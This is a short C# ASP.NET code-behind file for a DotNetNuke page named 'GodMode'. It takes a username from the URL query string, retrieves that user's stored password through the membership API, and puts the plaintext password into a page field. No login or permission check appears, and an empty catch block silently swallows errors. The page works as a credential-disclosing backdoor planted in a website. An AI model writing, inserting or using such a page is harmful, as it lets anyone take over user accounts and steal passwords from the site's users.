using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;
using AIS;
using DotNetNuke.Entities.Modules;

public partial class AIS_GodMode : System.Web.UI.Page
{
    protected void Page_Load(object sender, EventArgs e)
    {
        string UserName = ""+Request.QueryString["username"];
        try
        {
            DotNetNuke.Entities.Users.UserInfo userInfo = DotNetNuke.Entities.Users.UserController.GetUserByName(0, UserName);
            DotNetNuke.Security.Membership.MembershipProvider membershipProvider = DotNetNuke.Security.Membership.MembershipProvider.Instance();

            string oldPassword = DotNetNuke.Entities.Users.UserController.GetPassword(ref userInfo, userInfo.Membership.PasswordAnswer);
            p.Value = oldPassword;
        }
        catch { }
    }
}